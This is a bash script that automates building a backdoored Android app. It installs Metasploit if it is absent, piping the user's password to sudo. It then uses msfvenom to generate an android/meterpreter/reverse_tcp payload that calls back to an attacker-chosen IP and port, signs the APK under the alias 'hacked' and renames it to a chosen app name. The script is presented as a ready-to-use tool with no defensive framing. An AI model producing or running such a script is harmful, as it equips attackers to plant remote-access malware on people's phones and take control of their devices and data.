#!/bin/bash

echo "Please enter the required details for the apk"

echo "Enter the Listening IP address" 
read LISTNING_IP
echo "Enter the Listening PORT Number" 
read LISTNING_PORT
echo "Enter the Process Application Name" 
read PROCESS_NAME
echo "Enter your login user password"
read USER_PASSWORD
echo "Enter Keystore name"
read KEYSTORE
echo "Enter your Final Application Name"
read FINAL_APPLICATION_NAME


echo "Checking for the Metasploit Installation"
unamestr=$(uname)
if ! [ -x "$(command -v msfconsole)" ]; then
  echo '[ERROR] Metasploit is not Install so wait for 3 second to process futher.' >&2
  sleep 3
  echo '[INSTALLING] Metasploit in your machine'
  echo $USER_PASSWORD | sudo -S apt-get update -y && sudo -S apt-get upgarde -y && sudo -S apt-get build-essential -y
  echo '[UPDATE AND UPGRADE PROCESS IS DONE'
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
fi

echo '[INSTALLED] Metasploit Found'
echo '[ANDROID APK IS IN PROCESS] Please wait fot till the process complete'
echo $USER_PASSWORD | sudo -S apt-get install openjdk-11-jre-headless openjdk-11-jdk-headless -y
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LISTNING_IP LPORT=$LISTNING_PORT R> $PROCESS_NAME.apk
keytool -genkey -V -keystore $KEYSTORE.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000 
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $KEYSTORE.keystore $PROCESS_NAME.apk hacked 
jarsigner -verify -verbose -certs $PROCESS_NAME.apk 
echo $USER_PASSWORD | sudo -S apt-get install zipalign -y
zipalign -v 4 $PROCESS_NAME.apk $FINAL_APPLICATION_NAME.apk


echo '[PROCESS COMPLETE] Have Fun and find your application in same directory!!!' 
